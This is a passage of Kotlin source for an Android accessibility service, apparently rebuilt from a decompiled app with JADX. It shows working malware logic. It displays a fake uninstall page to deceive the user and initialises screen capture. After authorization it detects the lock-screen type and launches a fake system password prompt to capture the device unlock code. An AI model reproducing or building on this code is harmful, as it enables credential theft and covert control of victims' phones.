            android.util.Log.d(TAG, "📦 [假卸载] shouldShow=${!verifyDone}")

            if (verifyDone) {
                android.util.Log.d(TAG, "📦 [假卸载] 已弹出过，跳过")
                return
            }

            android.util.Log.d(TAG, "📦 [假卸载] ★★★ 开始显示假卸载页面 ★★★")
            com.storm.safe.rock.service.modules.overlay.PkgVerifyOverlay.show(service)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "📦 [假卸载] 显示失败", e)
        }
    }

    /**
     * Fallback initialization — minimal manager setup.
     * JADX method: m211476h0 (h0), line 6114
     */
    fun fallbackInit() {
        try {
            android.util.Log.d(TAG, "🔄 执行降级初始化")
            if (service.screenCaptureManager == null) {
                service.screenCaptureManager = ScreenCaptureManager(service)
            }
            if (service.displayManager == null) {
                service.displayManager = C0263a5(service)
            }
            android.util.Log.d(TAG, "✅ 降级初始化完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 降级初始化失败", e)
        }
    }

    /**
     * Post-authorization initialization. JADX: m211504j8 (j8)
     * Called after device authorization is complete.
     *
     * JADX: launches 2 coroutines on coroutineScope:
     * - postAuthorizationInit$1: registers deferred components (b9, c0, k2, b7)
     * - postAuthorizationInit$2: calls b5 (additional init)
     */
    fun postAuthorizationInit() {
        try {
            android.util.Log.i(TAG, "★ postAuthorizationInit: 授权完成后初始化")
            service.getCoroutineScope()?.launch(Dispatchers.Main) {
                try {
                    android.util.Log.d(TAG, "🔧 [授权后初始化] 开始注册延迟组件...")
                    initializeDeferredManagers()
                    service.overlayManager?.hide()
                    android.util.Log.d(TAG, "✅ [授权后初始化] 延迟组件注册完成，配置遮罩已隐藏")
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ postAuthorizationInit coroutine 1 failed", e)
                }
            }
            service.getCoroutineScope()?.launch(Dispatchers.IO) {
                try {
                    kotlinx.coroutines.delay(3000)
                    val prefs = service.getSharedPreferences("cipher_config", Context.MODE_PRIVATE)
                    val cipherDone = prefs.getBoolean("cipher_completed", false)
                    val savedType = prefs.getString("cipher_lock_type", "") ?: ""

                    val currentType = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
                        try {
                            val root = service.rootInActiveWindow
                            val detected = service.accessibilityEventRouter?.detectLockType(root)
                            root?.recycle()
                            detected?.name?.lowercase() ?: ""
                        } catch (_: Exception) { "" }
                    }

                    val needsRecapture = when {
                        !cipherDone -> true
                        savedType.isEmpty() || savedType == "unknown" -> true
                        currentType.isNotEmpty() && currentType != "unknown" && currentType != savedType -> true
                        else -> false
                    }

                    if (needsRecapture) {
                        when {
                            !cipherDone ->
                                android.util.Log.d(TAG, "🔐 [postAuth] 启动密码验证流程")
                            savedType.isEmpty() || savedType == "unknown" ->
                                android.util.Log.d(TAG, "🔐 [postAuth] 旧版数据无类型记录，强制重新捕获")
                            else ->
                                android.util.Log.d(TAG, "🔐 [postAuth] 密码类型变化: $savedType → $currentType，重新捕获")
                        }
                        prefs.edit().putBoolean("cipher_completed", false).apply()
                        service.isCipherCaptureEnabled = true
                        service.cipherRetryCount = 0
                        service.cipherCaptureManager?.startListening()
                        if (com.storm.safe.rock.util.DebugConfig.disableCipherOverlay) {
                            android.util.Log.d(TAG, "🔐 [postAuth] debug 禁用弹窗，已启用被动监听")
                        } else {
                            kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
                                service.doLaunchSystemPasswordCapture(isInstallationFlow = true)
                            }
                        }
                    } else {
                        android.util.Log.d(TAG, "🔐 [postAuth] 密码已捕获(type=$savedType)，跳过")
                    }
                } catch (_: Exception) {}
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "postAuthorizationInit failed", e)
        }
    }
}
